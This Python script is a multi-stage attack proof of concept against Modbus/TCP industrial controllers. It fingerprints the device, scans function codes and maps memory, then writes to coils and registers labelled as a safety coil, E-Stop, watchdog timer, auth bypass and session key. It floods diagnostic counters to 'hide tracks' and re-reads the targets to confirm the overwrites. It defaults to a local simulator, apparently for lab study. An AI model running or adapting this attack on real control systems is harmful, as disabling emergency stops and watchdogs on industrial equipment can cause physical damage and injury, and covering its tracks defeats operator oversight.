"""
Multi-Stage Modbus Attack PoC — 高级六阶段攻击演示
Stage 1: Device Identification · Stage 2: Function Scan
Stage 3: Memory Mapping · Stage 4: Critical Register Write
Stage 5: Diagnostic Counter Flood · Stage 6: Overwrite Verification
"""
import socket, struct, time, sys, random

MBAP = struct.Struct(">HHHB")

FUNC_NAMES = {
    1: "Read Coils", 2: "Read Discrete Inputs", 3: "Read Holding Registers",
    4: "Read Input Registers", 5: "Write Single Coil", 6: "Write Single Register",
    7: "Read Exception Status", 8: "Diagnostics", 15: "Write Multiple Coils",
    16: "Write Multiple Registers", 17: "Report Server ID",
    22: "Mask Write Register", 23: "Read/Write Multiple Registers",
    43: "Read Device Identification",
}

CRITICAL_WRITE_ADDRS = [
    (0x0000, 1, 0xFF00),  # Safety coil 0 = ON
    (0x0001, 1, 0x0000),  # E-Stop coil 1 = OFF
    (0x2000, 0x0001),     # Critical config reg = 1
    (0x3000, 0x0000),     # Diagnostic control reg = 0
    (0x2001, 0x0000),     # Watchdog timer = 0 (disabled)
    (0x2002, 0xFFFF),     # Auth bypass register
    (0x2003, 0xBEEF),     # Session key override
]


def mbap_packet(tid, pid, unit, pdu):
    return MBAP.pack(tid, pid, len(pdu) + 1, unit) + pdu


def send_recv(sock, tid, unit, pdu, timeout=2.0):
    packet = mbap_packet(tid, 0, unit, pdu)
    sock.sendall(packet)
    sock.settimeout(timeout)
    try:
        resp = sock.recv(4096)
        return resp
    except socket.timeout:
        return None


def print_status(stage, msg, ok=True):
    mark = "[+]" if ok else "[-]"
    print(f"  {mark} {msg}")


def stage1_device_id(sock, unit=1):
    print(f"\n{'='*60}")
    print(f"STAGE 1: Device Identification Fingerprinting")
    print(f"{'='*60}")
    start = time.time()
    pdu = bytes([0x2B, 0x0E, 0x01, 0x00])
    resp = send_recv(sock, 1, unit, pdu)
    if resp and len(resp) >= 8:
        _, _, _, _ = MBAP.unpack(resp[:7])
        data = resp[7:]
        more_follows = data[4] if len(data) > 4 else 0
        obj_count = data[5] if len(data) > 5 else 0
        print_status("Device ID", f"Responded: {obj_count} objects (more={more_follows})")
        parsed = {}
        off = 7
        for i in range(obj_count):
            if off + 3 > len(data):
                break
            oid = data[off]; oid_len = data[off+2]; off += 3
            if off + oid_len <= len(data):
                val = data[off:off+oid_len]
                labels = {0: "Vendor", 1: "Product", 2: "Version", 3: "URL", 4: "Name", 5: "Date"}
                parsed[labels.get(oid, f"Obj_{oid}")] = val.decode("ascii", errors="replace").strip("\x00")
                print(f"    {labels.get(oid, f'Obj_{oid}')}: {parsed[labels.get(oid, f'Obj_{oid}')]}")
                off += oid_len
        elapsed = time.time() - start
        print_status("Fingerprint complete", f"{elapsed:.3f}s")
        return parsed
    print_status("Device ID failed", "No response or invalid", False)
    return None


def stage2_func_scan(sock, unit=1):
    print(f"\n{'='*60}")
    print(f"STAGE 2: Function Code Scan (with timing)")
    print(f"{'='*60}")
    funcs_to_probe = [1, 2, 3, 4, 5, 6, 7, 8, 11, 12, 15, 16, 17, 20, 21, 22, 23, 24, 43]
    results = {}
    for fcode in funcs_to_probe:
        try:
            pdu = bytes([fcode, 0x00, 0x00, 0x00, 0x01])
            if fcode == 8:
                pdu = bytes([fcode, 0x00, 0x00, 0x00, 0x00])
            elif fcode in {5, 6}:
                pdu = bytes([fcode, 0x00, 0x00, 0x00, 0x00])
            start = time.time()
            tid = random.randint(1, 65535)
            resp = send_recv(sock, tid, unit, pdu, timeout=1.0)
            elapsed = (time.time() - start) * 1000
            if resp:
                rfunc = resp[7] if len(resp) > 7 else 0
                is_exc = bool(rfunc & 0x80)
                name = FUNC_NAMES.get(fcode, f"0x{fcode:02X}")
                exc_code = resp[8] if is_exc and len(resp) > 8 else None
                if is_exc:
                    print_status(name, f"Exception code={exc_code} ({elapsed:.1f}ms)")
                else:
                    print_status(name, f"OK ({elapsed:.1f}ms)")
                results[fcode] = {"exception": is_exc, "time_ms": elapsed, "exc_code": exc_code}
            else:
                print_status(f"Func 0x{fcode:02X}", "No response (timeout)", False)
                results[fcode] = {"exception": True, "time_ms": None, "exc_code": "timeout"}
            time.sleep(0.05)
        except Exception as e:
            print_status(f"Func 0x{fcode:02X}", f"Error: {e}", False)
    supported = [f for f, r in results.items() if not r.get("exception")]
    print(f"\n  Summary: {len(supported)}/{len(funcs_to_probe)} functions available")
    print(f"  Supported: {[FUNC_NAMES.get(f, hex(f)) for f in supported]}")
    return results


def stage3_memory_map(sock, unit=1):
    print(f"\n{'='*60}")
    print(f"STAGE 3: Memory Mapping (Coils + Registers)")
    print(f"{'='*60}")
    start = time.time()

    pdu_coils = bytes([0x01, 0x00, 0x00, 0x00, 0x40])
    resp = send_recv(sock, 1, unit, pdu_coils, timeout=2.0)
    coil_count = 0
    if resp and len(resp) > 8:
        byte_count = resp[8]
        coil_count = byte_count * 8
        print_status("Coils 0-511", f"{coil_count} coils read OK")

    pdu_discrete = bytes([0x02, 0x00, 0x00, 0x00, 0x40])
    resp = send_recv(sock, 2, unit, pdu_discrete, timeout=2.0)
    discrete_count = 0
    if resp and len(resp) > 8:
        byte_count = resp[8]
        discrete_count = byte_count * 8
        print_status("Discrete Inputs 0-511", f"{discrete_count} inputs read OK")

    pdu_holding = bytes([0x03, 0x00, 0x00, 0x00, 0x40])
    resp = send_recv(sock, 3, unit, pdu_holding, timeout=2.0)
    holding_count = 0
    if resp and len(resp) > 9:
        byte_count = resp[8]
        holding_count = byte_count // 2
        print_status("Holding Regs 0-63", f"{holding_count} registers read OK")

    pdu_input = bytes([0x04, 0x00, 0x00, 0x00, 0x40])
    resp = send_recv(sock, 4, unit, pdu_input, timeout=2.0)
    input_count = 0
    if resp and len(resp) > 9:
        byte_count = resp[8]
        input_count = byte_count // 2
        print_status("Input Regs 0-63", f"{input_count} registers read OK")

    elapsed = time.time() - start
    print_status("Memory mapping complete", f"{elapsed:.3f}s")
    return {"coils": coil_count, "discrete": discrete_count,
            "holding": holding_count, "input": input_count}


def stage4_critical_write(sock, unit=1):
    print(f"\n{'='*60}")
    print(f"STAGE 4: Critical Register Write (Safety Shutdown)")
    print(f"{'='*60}")
    start = time.time()
    written = []
    for i, entry in enumerate(CRITICAL_WRITE_ADDRS):
        if len(entry) == 3:
            addr, coil, val = entry
            pdu = bytes([0x05]) + struct.pack(">HH", addr, val)
            label = f"Write Coil 0x{addr:04X} = {'ON' if val == 0xFF00 else 'OFF'}"
        else:
            addr, val = entry
            pdu = bytes([0x06]) + struct.pack(">HH", addr, val)
            label = f"Write Reg 0x{addr:04X} = 0x{val:04X}"
        resp = send_recv(sock, i + 100, unit, pdu, timeout=1.0)
        if resp and len(resp) > 7:
            rfunc = resp[7]
            if not (rfunc & 0x80):
                print_status(label, "OK")
                written.append(entry)
            else:
                print_status(label, f"Exception 0x{resp[8]:02X}", False)
        else:
            print_status(label, "No response", False)
        time.sleep(0.02)
    elapsed = time.time() - start
    print_status(f"Critical write complete ({len(written)}/{len(CRITICAL_WRITE_ADDRS)})",
                 f"{elapsed:.3f}s")
    return written


def stage5_flood_diag(sock, unit=1):
    print(f"\n{'='*60}")
    print(f"STAGE 5: Diagnostic Counter Flood (Hide Tracks)")
    print(f"{'='*60}")
    start = time.time()
    for i in range(50):
        sub = 10 if i < 25 else 20
        pdu = bytes([0x08]) + struct.pack(">HH", sub, 0x0000)
        tid = random.randint(1, 65535)
        resp = send_recv(sock, tid, unit, pdu, timeout=0.5)
        if i == 0:
            if resp and not (resp[7] & 0x80 if len(resp) > 7 else True):
                print_status(f"Diag Clear (sub=0x{sub:04X})", "OK (starting flood)")
            else:
                print_status(f"Diag Clear (sub=0x{sub:04X})", "Blocked", False)
        time.sleep(0.01)
    elapsed = time.time() - start
    print_status(f"Flood complete (50 diag commands)", f"{elapsed:.3f}s")


def stage6_verify(sock, unit=1):
    print(f"\n{'='*60}")
    print(f"STAGE 6: Overwrite Verification (Re-read)")
    print(f"{'='*60}")
    start = time.time()
    verified = 0
    for i, entry in enumerate(CRITICAL_WRITE_ADDRS[:4]):
        if len(entry) == 3:
            addr, coil, expected = entry
            pdu = bytes([0x01]) + struct.pack(">HH", addr, 1)
            label = f"Coil 0x{addr:04X}"
        else:
            addr, expected = entry
            pdu = bytes([0x03]) + struct.pack(">HH", addr, 1)
            label = f"Reg 0x{addr:04X}"
        resp = send_recv(sock, 200 + i, unit, pdu, timeout=1.0)
        if resp and len(resp) > 9:
            if "Coil" in label:
                byte_val = resp[9] if len(resp) > 9 else 0
                current = (byte_val >> (addr % 8)) & 1
                expected_bit = 1 if expected == 0xFF00 else 0
                if current == expected_bit:
                    print_status(label, f"Confirmed = {current} (expected {expected_bit})")
                    verified += 1
                else:
                    print_status(label, f"Mismatch: got {current}, expected {expected_bit}", False)
            else:
                current = struct.unpack(">H", resp[9:11])[0] if len(resp) >= 11 else 0
                if current == expected:
                    print_status(label, f"Confirmed = 0x{current:04X}")
                    verified += 1
                else:
                    print_status(label, f"Mismatch: got 0x{current:04X}, expected 0x{expected:04X}", False)
        else:
            print_status(label, "Verification failed", False)
        time.sleep(0.02)
    elapsed = time.time() - start
    print_status(f"Verification complete ({verified}/4 confirmed)", f"{elapsed:.3f}s")
    return verified


def run_attack(host="127.0.0.1", port=502, unit=1):
    print(f"\n{'#'*60}")
    print(f"# Advanced Modbus Multi-Stage Attack PoC")
    print(f"# Target: {host}:{port} (unit={unit})")
    print(f"{'#'*60}")
    total_start = time.time()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.settimeout(3.0)
        sock.connect((host, port))
        print_status("Connection", f"Connected to {host}:{port}")

        fingerprint = stage1_device_id(sock, unit)
        if not fingerprint:
            print("\n[!] Target did not respond to Device ID. Aborting.")
            return

        func_map = stage2_func_scan(sock, unit)
        mem_map = stage3_memory_map(sock, unit)
        written = stage4_critical_write(sock, unit)
        stage5_flood_diag(sock, unit)
        verified = stage6_verify(sock, unit)

    except ConnectionRefusedError:
        print(f"\n[!] Connection refused: {host}:{port}")
        print("    Make sure the simulator is running first.")
        return
    except socket.timeout:
        print(f"\n[!] Connection timed out: {host}:{port}")
    except Exception as e:
        print(f"\n[!] Error: {e}")
    finally:
        sock.close()
        total_elapsed = time.time() - total_start

    print(f"\n{'='*60}")
    print(f"ATTACK COMPLETE — Total time: {total_elapsed:.2f}s")
    print(f"{'='*60}")


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 502
    unit = int(sys.argv[3]) if len(sys.argv) > 3 else 1
    run_attack(host, port, unit)
